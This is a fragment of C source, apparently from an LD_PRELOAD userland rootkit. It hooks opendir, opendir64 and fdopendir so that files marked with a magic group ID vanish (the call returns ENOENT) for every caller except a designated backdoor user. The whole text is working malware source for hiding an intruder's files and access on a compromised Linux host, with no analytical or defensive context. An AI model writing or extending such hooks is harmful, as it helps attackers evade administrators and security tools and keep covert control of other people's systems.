DIR *opendir(const char *pathname)
{
    HOOK(o_opendir, COPENDIR);
    if(is_bdusr()) return o_opendir(pathname);
    if(hxstat(pathname,MGID,32)) { errno = ENOENT; return NULL; }
    return o_opendir(pathname);
}

DIR *opendir64(const char *pathname)
{
    HOOK(o_opendir64, COPENDIR64);
    if(is_bdusr()) return o_opendir64(pathname);
    if(hxstat(pathname,MGID,32)) { errno = ENOENT; return NULL; }
    return o_opendir64(pathname);
}

DIR *fdopendir(int fd)
{
    HOOK(o_fdopendir, CFDOPENDIR);
    if(is_bdusr()) return o_fdopendir(fd);
    if(hfxstat(fd,MGID,32)) { errno = ENOENT; return NULL; }
    return o_fdopendir(fd);
}
